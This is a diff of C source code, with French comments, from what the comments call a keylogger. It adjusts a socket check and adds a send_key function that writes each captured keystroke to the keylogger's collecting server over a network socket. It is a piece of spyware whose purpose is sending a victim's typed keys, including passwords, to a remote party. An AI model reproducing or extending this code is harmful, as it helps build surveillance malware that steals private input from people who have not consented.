@@ -72,12 +72,35 @@ int close_server_connection(void) {
 int read_keys(void) {
 	int n;
 
-	if (server.sockfd < 0) return _SERVER_NOT_INIT_;
+	if (server.sockfd <= 0) return _SERVER_NOT_INIT_;
 
 	bzero(&server.buffer, sizeof(struct receive_key));
 	n = read(server.sockfd, &server.buffer, sizeof(struct receive_key));
 	if (n < 0)
 		return _ERROR_SRV_READ_;
+
+	return _SUCCESS_;
+}
+
+/*
+*  send_key permet de transmettre un touche via le structure receive_key
+*  au serveur du keylogger
+*
+*  input :
+*    struct receive_key key -> touche a transmettre
+*
+*  output:
+*    _SERVER_NOT_INIT_ -> si la connection au serveur n'est pas etablie
+*    _ERROR_SRV_WRITE_ -> si une erreur est arrive lors de l'envoie de donne
+*    _SUCCESS_         -> si pas d'erreur
+*/
+int send_key(struct receive_key key) {
+	int n;
+
+	if (server.sockfd <= 0) return _SERVER_NOT_INIT_;
+
+	n = write(server.sockfd, &key, sizeof(struct receive_key));
+	if (n < 0) return _ERROR_SRV_WRITE_;
 
 	return _SUCCESS_;
 }
